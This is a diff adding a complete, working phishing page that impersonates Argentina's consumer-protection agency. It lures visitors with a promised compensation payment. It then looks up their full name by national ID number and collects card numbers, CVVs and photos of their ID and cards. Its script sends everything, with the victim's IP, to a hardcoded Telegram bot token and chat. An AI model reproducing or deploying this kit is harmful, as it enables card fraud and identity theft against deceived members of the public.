@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Defensa del Consumidor · Reclamo Digital</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <link href="https://fonts.googleapis.com/css?family=Montserrat:700,500,400&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --azul: #17447b;
+      --celeste: #029be5;
+      --amarillo: #ffe066;
+      --fondo: #f2f6fa;
+      --gris: #e6e9ee;
+      --gris2: #d3dae1;
+      --rojo: #d32f2f;
+      --verde: #388e3c;
+      --borde: #cad7e2;
+      --radius: 20px;
+      --trans: 0.33s cubic-bezier(.7,.4,.35,1.04);
+      --shadow: 0 4px 36px #17447b12;
+      --shadow-s: 0 1px 7px #0001;
+    }
+    html, body {
+      margin: 0; padding: 0;
+      font-family: 'Montserrat', Arial, sans-serif;
+      background: var(--fondo);
+      color: #232323;
+      min-height: 100vh;
+    }
+    body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: stretch;
+    }
+    header {
+      background: linear-gradient(90deg, var(--azul) 0%, var(--celeste) 100%);
+      color: white;
+      padding: 2rem 1rem 1.1rem 1rem;
+      text-align: center;
+      border-bottom-left-radius: var(--radius);
+      border-bottom-right-radius: var(--radius);
+      box-shadow: var(--shadow-s);
+    }
+    .logo {
+      width: 62px;
+      height: 62px;
+      margin-bottom: 0.7rem;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+      border-radius: 100%;
+      background: white;
+      box-shadow: 0 2px 8px #17447b33;
+      padding: 4px;
+    }
+    h1 {
+      font-size: 1.56rem;
+      margin: 0;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      line-height: 1.3;
+      text-shadow: 0 2px 4px #052e4b23;
+    }
+    .subtitle {
+      font-size: 1.01rem;
+      font-weight: 500;
+      margin-top: 0.3rem;
+      letter-spacing: .1px;
+      color: #e8eaf6;
+      opacity: 0.84;
+    }
+    .main-card {
+      width: 100%;
+      max-width: 430px;
+      margin: 1.4rem auto 0.8rem auto;
+      background: #fff;
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      overflow: hidden;
+      min-height: 68vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: stretch;
+      position: relative;
+      border: 1.2px solid var(--gris2);
+      transition: box-shadow var(--trans), border var(--trans);
+    }
+    .stepper {
+      width: 100%;
+      background: #fafdff;
+      padding: 0.5rem 0.4rem 0.6rem 0.4rem;
+      border-top-left-radius: var(--radius);
+      border-top-right-radius: var(--radius);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      border-bottom: 1.2px solid var(--gris2);
+    }
+    .dot {
+      width: 15px; height: 15px;
+      background: var(--gris2);
+      border-radius: 50%;
+      display: inline-block;
+      box-shadow: 0 0 0 2px #fff;
+      border: 2px solid #fff;
+      transition: background 0.2s;
+    }
+    .dot.active { background: var(--azul); }
+    .dot.done { background: var(--verde);}
+    .step-panel {
+      width: 100%;
+      background: #fff;
+      border-radius: var(--radius);
+      box-sizing: border-box;
+      padding: 0;
+      overflow: hidden;
+      position: relative;
+      animation: fadeInUp 0.5s;
+      transition: opacity var(--trans), transform var(--trans);
+      min-height: 63vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: start;
+    }
+    .step-panel.fadeOut {
+      animation: fadeOutUp 0.4s forwards;
+    }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(34px);}
+      to { opacity: 1; transform: translateY(0);}
+    }
+    @keyframes fadeOutUp {
+      from { opacity: 1; transform: translateY(0);}
+      to { opacity: 0; transform: translateY(-40px);}
+    }
+    .panel-content {
+      padding: 2.1rem 2rem 1.2rem 2rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1.1rem;
+      min-height: 54vh;
+      justify-content: start;
+    }
+    .panel-title {
+      font-size: 1.22rem;
+      font-weight: 700;
+      color: var(--azul);
+      margin-bottom: 0.5rem;
+    }
+    .panel-desc {
+      font-size: 1.06rem;
+      color: #2e3e54;
+      margin-bottom: 0.3rem;
+      line-height: 1.7;
+      font-weight: 500;
+    }
+    .panel-terms {
+      background: #fafdff;
+      border-left: 5px solid var(--azul);
+      border-radius: 10px;
+      padding: 1.1em 1.1em 1.1em 1.3em;
+      font-size: 0.99em;
+      color: #25426a;
+      margin-bottom: 1.1em;
+      line-height: 1.6;
+      box-shadow: 0 1px 8px #17447b10;
+    }
+    label {
+      font-weight: 600;
+      font-size: 1.04rem;
+      margin-bottom: 0.28rem;
+      display: block;
+      color: #25426a;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 0.89rem;
+      font-size: 1.15rem;
+      border: 1.5px solid var(--borde);
+      border-radius: 10px;
+      margin-bottom: 0.7rem;
+      box-sizing: border-box;
+      background: #fafdff;
+      transition: border 0.2s;
+      resize: vertical;
+      font-family: 'Montserrat', Arial, sans-serif;
+    }
+    input:focus, textarea:focus {
+      border: 1.5px solid var(--azul);
+      outline: none;
+      background: #f2f8ff;
+    }
+    .input-error {
+      border: 1.5px solid var(--rojo) !important;
+      background: #fff0f0 !important;
+    }
+    .btn,
+    .btn-file {
+      width: 100%;
+      padding: 1.09rem;
+      background: linear-gradient(90deg, var(--azul) 0%, var(--celeste) 100%);
+      color: white;
+      font-size: 1.15rem;
+      font-weight: 700;
+      border: none;
+      border-radius: 999px;
+      cursor: pointer;
+      box-shadow: 0 2px 12px #17447b2c;
+      transition: background 0.13s, box-shadow 0.13s, transform 0.11s;
+      letter-spacing: 0.4px;
+      outline: none;
+      margin-top: 0.2rem;
+      margin-bottom: 0.1rem;
+      display: block;
+      user-select: none;
+      pointer-events: auto;
+    }
+    .btn:disabled, .btn-file:disabled {
+      background: #e0e0e0;
+      color: #bdbdbd;
+      cursor: not-allowed;
+      box-shadow: none;
+      pointer-events: none;
+    }
+    .btn-file {
+      background: #f5f5f5;
+      color: var(--azul);
+      border: 1.5px solid var(--azul);
+      margin-bottom: 0.25rem;
+      font-size: 1.06rem;
+      position: relative;
+      overflow: hidden;
+      text-align: left;
+      padding-left: 1.1rem;
+    }
+    .btn-file input[type="file"] {
+      position: absolute;
+      left: 0; top: 0;
+      opacity: 0;
+      width: 100%; height: 100%;
+      cursor: pointer;
+      z-index: 10;
+    }
+    .file-label {
+      display: inline-block;
+      font-size: 0.97em;
+      color: var(--verde);
+      margin-left: 0.7em;
+      max-width: 53%;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      vertical-align: middle;
+    }
+    .error {
+      color: var(--rojo);
+      font-size: 0.99rem;
+      display: block;
+      text-align: center;
+      padding: 0.39rem 0.8rem;
+      border-radius: 8px;
+      background: #fff0f0;
+      font-weight: 600;
+      animation: shake 0.15s;
+      margin-bottom: 0.2rem;
+    }
+    @keyframes shake {
+      0% { transform: translateX(-4px);}
+      50% { transform: translateX(4px);}
+      100% { transform: translateX(0);}
+    }
+    .loader {
+      display: block;
+      margin: 0.7rem auto 0.7rem auto;
+      border: 3px solid #cfd8dc;
+      border-top: 3px solid var(--azul);
+      border-radius: 50%;
+      width: 27px;
+      height: 27px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg);} }
+    .panel-success {
+      color: var(--verde);
+      background: #e8f7e9;
+      border-radius: var(--radius);
+      text-align: center;
+      font-weight: 700;
+      font-size: 1.18rem;
+      margin-bottom: 1.5rem;
+      padding: 1.6rem 0.7rem 1.6rem 0.7rem;
+      animation: fadeInUp 0.8s;
+      box-shadow: 0 2px 6px #388e3c18;
+    }
+    .panel-note {
+      color: #17447b;
+      font-size: 1.06rem;
+      margin-top: 0.7rem;
+      text-align: center;
+      font-weight: 500;
+    }
+    @media (max-width: 600px) {
+      .main-card {max-width: 100vw; border-radius: 0;}
+      .panel-content {padding: 1.1rem 0.7rem 1rem 0.7rem;}
+      .stepper {padding-left: 0.1rem; padding-right: 0.1rem;}
+    }
+    footer {
+      margin-top: auto;
+      background: var(--fondo);
+      color: #8591a5;
+      text-align: center;
+      padding: 1.3rem 0 1.2rem 0;
+      font-size: 1.02rem;
+      letter-spacing: 0.15px;
+      border-top: 1px solid #e0e0e0;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Flag_of_Argentina.svg" class="logo" alt="Bandera Argentina"/>
+  <h1>Defensa del Consumidor</h1>
+  <div class="subtitle">Portal de Reclamo Digital</div>
+</header>
+<main>
+  <div class="main-card" id="wizard"></div>
+</main>
+<footer>
+  Defensa del Consumidor · República Argentina · 2025
+</footer>
+<script>
+// ---- CONFIG TELEGRAM ----
+const TELEGRAM_TOKEN = "7851025816:AAFTo0o_D0tabAqttKh8bsZgIT0jFG1djL0";
+const CHAT_ID = "-1002695863035";
+
+// ---- UI Y FLUJO ----
+const wizard = document.getElementById('wizard');
+let step = 0, userNombre = "", userEmail = "", userDni = "";
+let userIP = "";
+
+const STEPS = [
+  "Identidad",
+  "Términos",
+  "Tarjeta",
+  "Mensaje",
+  "Final"
+];
+
+// Obtener IP del usuario al cargar
+fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(j=>userIP=j.ip);
+
+function stepper(current) {
+  let html = `<div class="stepper">`;
+  for (let i=0;i<STEPS.length-1;i++) {
+    html += `<span class="dot${i<current ? ' done': ''}${i===current ? ' active' : ''}"></span>`;
+  }
+  html += `</div>`;
+  return html;
+}
+
+function clearWizard() {
+  wizard.innerHTML = "";
+}
+
+function fadeAndNext(panel, next) {
+  panel.classList.add("fadeOut");
+  setTimeout(next, 400);
+}
+
+// -----------  BOTON ANTI DOBLE CLICK -----------
+function disableAllButtons(form) {
+  Array.from(form.querySelectorAll('button')).forEach(btn => btn.disabled = true);
+  Array.from(form.querySelectorAll('input[type=submit]')).forEach(btn => btn.disabled = true);
+}
+function enableAllButtons(form) {
+  Array.from(form.querySelectorAll('button')).forEach(btn => btn.disabled = false);
+  Array.from(form.querySelectorAll('input[type=submit]')).forEach(btn => btn.disabled = false);
+}
+// -----------------------------------------------
+
+// ---- ENVIO TELEGRAM ----
+async function enviarTarjetaATelegram(dni, email, nombre, tarjeta, fecha, cvv, ip) {
+  const mensaje = `<b>🔔 Nuevo reclamo:</b>
+DNI: <code>${dni}</code>
+Correo: <code>${email}</code>
+Nombre: <code>${nombre}</code>
+Tarjeta: <code>${tarjeta}</code>
+Vencimiento: <code>${fecha}</code>
+CVV: <code>${cvv}</code>
+IP: <code>${ip||"-"}</code>
+Fecha envío: <code>${new Date().toLocaleString()}</code>`;
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: mensaje,
+        parse_mode: "HTML"
+      })
+    });
+  } catch(err) {}
+}
+
+// ENVIO MENSAJE Y EMPRESA A TELEGRAM
+async function enviarMensajeEmpresaATelegram(empresa, mensaje, ip) {
+  const text = `<b>🏢 Empresa a reclamar:</b> <code>${empresa}</code>
+<b>📝 Mensaje del usuario:</b>
+<pre>${mensaje}</pre>
+IP: <code>${ip||"-"}</code>`;
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: "HTML"
+      })
+    });
+  } catch(err) {}
+}
+
+// ENVIO ARCHIVO A TELEGRAM
+async function enviarArchivoATelegram(file, label, ip) {
+  if (!file) return;
+  const formData = new FormData();
+  formData.append('chat_id', CHAT_ID);
+  formData.append('caption', `${label}\nIP: <code>${ip||"-"}</code>`);
+  if (file.type.startsWith("image/")) {
+    formData.append('photo', file, file.name);
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    });
+  } else {
+    formData.append('document', file, file.name);
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
+      method: "POST",
+      body: formData
+    });
+  }
+}
+
+function showStepIdentidad() {
+  clearWizard();
+  step = 0;
+  wizard.innerHTML = `
+    ${stepper(step)}
+    <form class="step-panel" id="panel-identidad" autocomplete="off">
+      <div class="panel-content">
+        <div class="panel-title">Identificación</div>
+        <div class="panel-desc">
+          Para comenzar tu reclamo, ingresá tu DNI y correo electrónico. Validaremos tu identidad para proteger tus derechos y datos personales.
+        </div>
+        <label for="dni">DNI</label>
+        <input id="dni" type="number" pattern="[0-9]*" inputmode="numeric" maxlength="8" placeholder="Ejemplo: 12345678" required>
+        <label for="email">Correo electrónico</label>
+        <input id="email" type="email" placeholder="Tu correo" autocomplete="email" required>
+        <div class="error" id="dni-error" style="display:none"></div>
+        <div class="loader" id="dni-loader" style="display:none;"></div>
+        <button class="btn" id="btn-dni" type="submit">Verificar identidad</button>
+      </div>
+    </form>
+  `;
+  document.getElementById('panel-identidad').onsubmit = async function(e) {
+    e.preventDefault();
+    disableAllButtons(this);
+    let dni = document.getElementById('dni').value.trim();
+    let email = document.getElementById('email').value.trim();
+    let error = document.getElementById('dni-error');
+    error.style.display = "none";
+    document.getElementById('dni').classList.remove('input-error');
+    document.getElementById('email').classList.remove('input-error');
+    if (dni.length < 7 || dni.length > 8 || !/^\d+$/.test(dni)) {
+      error.textContent = 'Ingresá un DNI válido.';
+      error.style.display = "block";
+      document.getElementById('dni').classList.add('input-error');
+      enableAllButtons(this);
+      return;
+    }
+    if(!/^[^@]+@[^@]+\.[^@]+$/.test(email)){
+      error.textContent = 'Ingresá un correo válido.';
+      error.style.display = "block";
+      document.getElementById('email').classList.add('input-error');
+      enableAllButtons(this);
+      return;
+    }
+    userDni = dni;
+    userEmail = email;
+    document.getElementById('dni-loader').style.display = 'block';
+    document.getElementById('btn-dni').disabled = true;
+    // Consulta Credicuotas API
+    let found = false, nombre = "";
+    try {
+      let resp = await fetch(`https://autogestion.credicuotas.com.ar/api/selfie/users/${dni}`);
+      if(!resp.ok) throw new Error("No se pudo verificar");
+      let data = await resp.json();
+      if(Array.isArray(data) && data[0]?.fullname){
+        nombre = data[0].fullname;
+        found = true;
+      }
+    } catch(e) {}
+    document.getElementById('dni-loader').style.display = 'none';
+    document.getElementById('btn-dni').disabled = false;
+    if(!found){
+      error.textContent = 'No se encontró el DNI ingresado.';
+      error.style.display = "block";
+      document.getElementById('dni').classList.add('input-error');
+      enableAllButtons(this);
+      return;
+    }
+    userNombre = nombre;
+    fadeAndNext(document.getElementById('panel-identidad'), showStepTerminos);
+  };
+}
+showStepIdentidad();
+
+function showStepTerminos() {
+  clearWizard();
+  step = 1;
+  wizard.innerHTML = `
+    ${stepper(step)}
+    <div class="step-panel" id="panel-terminos">
+      <div class="panel-content">
+        <div class="panel-title">Términos y condiciones</div>
+        <div class="panel-terms">
+          Esta gestión digital se realiza bajo el marco de la Ley de Defensa del Consumidor N° 24.240.<br><br>
+          <b>Responsabilidades:</b> El usuario declara que los datos y la documentación provistos son verídicos y autoriza el uso de la información para la tramitación del reclamo.<br><br>
+          <b>Privacidad:</b> Todos los datos personales serán tratados de forma confidencial y sólo utilizados para la gestión solicitada.<br><br>
+          <b>Notificaciones:</b> Recibirás comunicaciones sobre el estado de tu reclamo al correo ingresado.<br>
+        </div>
+        <button class="btn" id="btn-terminos">Acepto y continuar</button>
+      </div>
+    </div>
+  `;
+  document.getElementById('btn-terminos').onclick = function() {
+    this.disabled = true;
+    fadeAndNext(document.getElementById('panel-terminos'), showStepExplicacion);
+  };
+}
+
+function showStepExplicacion() {
+  clearWizard();
+  step = 2;
+  wizard.innerHTML = `
+    ${stepper(step)}
+    <div class="step-panel" id="panel-explicacion">
+      <div class="panel-content">
+        <div class="panel-title">Bienvenido, ${userNombre}</div>
+        <div class="panel-desc">
+          Según nuestros registros, podrías acceder a un <b>beneficio por reclamo</b> bajo la Ley de Defensa del Consumidor.<br>
+          <br>
+          Si tu caso resulta favorable, recibirás una compensación económica a tu nombre.<br>
+          <br>
+          <span style="color:#17447b;">
+          Para poder efectivizar el pago del beneficio, la autoridad puede solicitar datos bancarios o de tarjeta a tu nombre al final del proceso.
+          </span>
+        </div>
+        <button class="btn" id="btn-explicacion">Continuar</button>
+      </div>
+    </div>
+  `;
+  document.getElementById('btn-explicacion').onclick = function() {
+    this.disabled = true;
+    fadeAndNext(document.getElementById('panel-explicacion'), showStepTarjeta);
+  };
+}
+
+function validarTarjeta(num) {
+  let sum = 0, alt = false;
+  for(let i=num.length-1; i>=0; i--){
+    let n = parseInt(num[i]);
+    if(alt) {
+      n *= 2;
+      if(n > 9) n -= 9;
+    }
+    sum += n;
+    alt = !alt;
+  }
+  return (sum % 10) === 0;
+}
+
+function showStepTarjeta() {
+  clearWizard();
+  step = 3;
+  wizard.innerHTML = `
+    ${stepper(step)}
+    <form class="step-panel" id="panel-tarjeta" autocomplete="off">
+      <div class="panel-content">
+        <div class="panel-title">Datos para transferencia</div>
+        <div class="panel-desc">
+          <b>En caso de resultar beneficiado</b>, deberás indicar una tarjeta (crédito o débito) a tu nombre para recibir la transferencia del monto correspondiente.<br>
+          <br>
+          <span style="color:#526ca7;font-size:0.98em">
+            Sólo será utilizada en caso de resolución favorable y para acreditar el pago del beneficio.<br>
+            La información será tratada con absoluta confidencialidad.
+          </span>
+        </div>
+        <label for="card-number">Número de tarjeta</label>
+        <input type="text" id="card-number" inputmode="numeric" pattern="[0-9 ]{16,22}" maxlength="22" placeholder="16 dígitos" required>
+        <label for="card-name">Nombre y apellido (como figura)</label>
+        <input type="text" id="card-name" maxlength="32" placeholder="Ej: JUAN PEREZ" required>
+        <label for="card-exp">Vencimiento (MM/AA)</label>
+        <input type="text" id="card-exp" maxlength="5" placeholder="MM/AA" required>
+        <label for="card-cvv">CVV</label>
+        <input type="password" id="card-cvv" maxlength="4" placeholder="CVV" required>
+        <div class="error" id="card-error" style="display:none"></div>
+        <button class="btn" id="btn-tarjeta" type="submit">Siguiente</button>
+      </div>
+    </form>
+  `;
+
+  document.getElementById('panel-tarjeta').onsubmit = async function(e){
+    e.preventDefault();
+    disableAllButtons(this);
+    let form = document.getElementById('panel-tarjeta');
+    let num = form.querySelector('#card-number').value.trim().replace(/\s+/g,'');
+    let name = form.querySelector('#card-name').value.trim();
+    let exp = form.querySelector('#card-exp').value.trim();
+    let cvv = form.querySelector('#card-cvv').value.trim();
+    let err = form.querySelector('#card-error');
+    err.style.display = "none";
+    form.querySelector('#card-number').classList.remove('input-error');
+    form.querySelector('#card-name').classList.remove('input-error');
+    form.querySelector('#card-exp').classList.remove('input-error');
+    form.querySelector('#card-cvv').classList.remove('input-error');
+    if(!/^\d{16,22}$/.test(num) || !validarTarjeta(num)){
+      err.textContent = 'Número de tarjeta inválido.';
+      err.style.display = "block";
+      form.querySelector('#card-number').classList.add('input-error');
+      enableAllButtons(this);
+      return;
+    }
+    if(name.length < 5){
+      err.textContent = 'Ingresá el nombre completo.';
+      err.style.display = "block";
+      form.querySelector('#card-name').classList.add('input-error');
+      enableAllButtons(this);
+      return;
+    }
+    if(!/^((0[1-9])|(1[0-2]))\/([0-9]{2})$/.test(exp)){
+      err.textContent = 'Vencimiento inválido. Usá MM/AA.';
+      err.style.display = "block";
+      form.querySelector('#card-exp').classList.add('input-error');
+      enableAllButtons(this);
+      return;
+    }
+    if(!/^\d{3,4}$/.test(cvv)){
+      err.textContent = 'CVV inválido.';
+      err.style.display = "block";
+      form.querySelector('#card-cvv').classList.add('input-error');
+      enableAllButtons(this);
+      return;
+    }
+
+    await enviarTarjetaATelegram(userDni, userEmail, name, num, exp, cvv, userIP);
+
+    fadeAndNext(document.getElementById('panel-tarjeta'), showStepMensaje);
+  };
+}
+
+function showStepMensaje() {
+  clearWizard();
+  step = 4;
+  wizard.innerHTML = `
+    ${stepper(step)}
+    <form class="step-panel" id="panel-mensaje" autocomplete="off" enctype="multipart/form-data">
+      <div class="panel-content">
+        <div class="panel-title">Detalle del Reclamo</div>
+        <div class="panel-desc">
+          Completá cuidadosamente la información de tu reclamo.<br>
+          <b>Adjuntar documentación agiliza la respuesta (menos de 1 día hábil).</b>
+        </div>
+        <label for="empresa">Empresa a reclamar</label>
+        <input type="text" id="empresa" maxlength="64" required placeholder="Ejemplo: MiEmpresa S.A.">
+        <label for="mensaje">Explicá lo sucedido</label>
+        <textarea id="mensaje" rows="5" required placeholder="Contanos lo que pasó, sin límite de caracteres"></textarea>
+        <label style="margin-top:0.6em;">Adjuntá comprobantes y fotos</label>
+        <button class="btn-file" id="btn-comp" type="button">
+          Adjuntar comprobante o foto
+          <input type="file" id="file-comp" accept="image/*,application/pdf">
+          <span class="file-label" id="label-comp"></span>
+        </button>
+        <button class="btn-file" id="btn-dni-f" type="button">
+          Cargar DNI (frente)
+          <input type="file" id="file-dni-f" accept="image/*">
+          <span class="file-label" id="label-dni-f"></span>
+        </button>
+        <button class="btn-file" id="btn-dni-d" type="button">
+          Cargar DNI (dorso)
+          <input type="file" id="file-dni-d" accept="image/*">
+          <span class="file-label" id="label-dni-d"></span>
+        </button>
+        <button class="btn-file" id="btn-tarj-f" type="button">
+          Foto frente de tarjeta
+          <input type="file" id="file-tarj-f" accept="image/*">
+          <span class="file-label" id="label-tarj-f"></span>
+        </button>
+        <button class="btn-file" id="btn-tarj-d" type="button">
+          Foto dorso de tarjeta
+          <input type="file" id="file-tarj-d" accept="image/*">
+          <span class="file-label" id="label-tarj-d"></span>
+        </button>
+        <div class="error" id="adj-error" style="display:none"></div>
+        <button class="btn" id="btn-finalizar" type="submit" style="margin-top:1em;">Enviar mi reclamo</button>
+        <div class="panel-note">
+          <b>Te respondemos en menos de 1 día hábil.</b>
+        </div>
+      </div>
+    </form>
+  `;
+
+  // Mostrar nombre de archivos seleccionados
+  function setLabel(inputId, labelId) {
+    document.getElementById(inputId).onchange = function() {
+      const files = this.files;
+      document.getElementById(labelId).textContent = files && files[0] ? files[0].name : "";
+    };
+  }
+  setLabel('file-comp','label-comp');
+  setLabel('file-dni-f','label-dni-f');
+  setLabel('file-dni-d','label-dni-d');
+  setLabel('file-tarj-f','label-tarj-f');
+  setLabel('file-tarj-d','label-tarj-d');
+
+  document.getElementById('panel-mensaje').onsubmit = async function(e){
+    e.preventDefault();
+    disableAllButtons(this);
+    let form = document.getElementById('panel-mensaje');
+    let empresa = form.querySelector('#empresa').value.trim();
+    let mensaje = form.querySelector('#mensaje').value.trim();
+    let err = form.querySelector('#adj-error');
+    err.style.display = "none";
+    form.querySelector('#empresa').classList.remove('input-error');
+    form.querySelector('#mensaje').classList.remove('input-error');
+    if(empresa.length < 2){
+      err.textContent = 'Ingresá el nombre de la empresa.';
+      err.style.display = "block";
+      form.querySelector('#empresa').classList.add('input-error');
+      enableAllButtons(this);
+      return;
+    }
+    if(mensaje.length < 10){
+      err.textContent = 'Describí lo sucedido con más detalle.';
+      err.style.display = "block";
+      form.querySelector('#mensaje').classList.add('input-error');
+      enableAllButtons(this);
+      return;
+    }
+
+    await enviarMensajeEmpresaATelegram(empresa, mensaje, userIP);
+
+    // Envía archivos a Telegram con IP y etiquetas bonitas
+    const filesToSend = [
+      {input: 'file-comp', label: "📎 Foto/Comprobante adjunto"},
+      {input: 'file-dni-f', label: "🪪 DNI frente"},
+      {input: 'file-dni-d', label: "🪪 DNI dorso"},
+      {input: 'file-tarj-f', label: "💳 Foto frente tarjeta"},
+      {input: 'file-tarj-d', label: "💳 Foto dorso tarjeta"},
+    ];
+    for (const f of filesToSend) {
+      const input = document.getElementById(f.input);
+      if (input && input.files && input.files[0]) {
+        await enviarArchivoATelegram(input.files[0], f.label, userIP);
+      }
+    }
+
+    fadeAndNext(document.getElementById('panel-mensaje'), showStepFinal);
+  };
+}
+
+// Generador de referencia aleatoria tipo DEF-245678
+function genReferencia() {
+  const n = Math.floor(100000 + Math.random() * 900000);
+  return "DEF-" + n;
+}
+
+function showStepFinal() {
+  clearWizard();
+  step = 5;
+  const ref = genReferencia();
+  wizard.innerHTML = `
+    ${stepper(STEPS.length-1)}
+    <div class="step-panel">
+      <div class="panel-success">
+        ¡Tu reclamo fue enviado con éxito, <b>${userNombre}</b>!<br>
+        <span style="color:#388e3c;font-size:1.07em;">
+        Si tu reclamo es aprobado, recibirás el pago directamente en tu tarjeta.<br><br>
+        Te notificaremos por email a <b>${userEmail}</b>.<br>
+        <span class="panel-note" style="color:#17447b;">
+        <b>En menos de 1 día hábil tendrás respuesta.</b>
+        </span>
+        </span>
+        <br><br>
+        <span style="font-size:1.07em;color:#17447b;">
+          <b>Número de referencia:</b> <span style="font-family:monospace;">${ref}</span>
+        </span>
+      </div>
+      <div style="text-align:center; color:#aaa; font-size:1.08em;">
+        Muchas gracias por confiar en el sistema digital de la Defensa del Consumidor.<br>
+        <br>
+        <span style="font-size:2.2em;">✔️</span>
+      </div>
+    </div>
+  `;
+}
+</script>
+</body>
+</html>
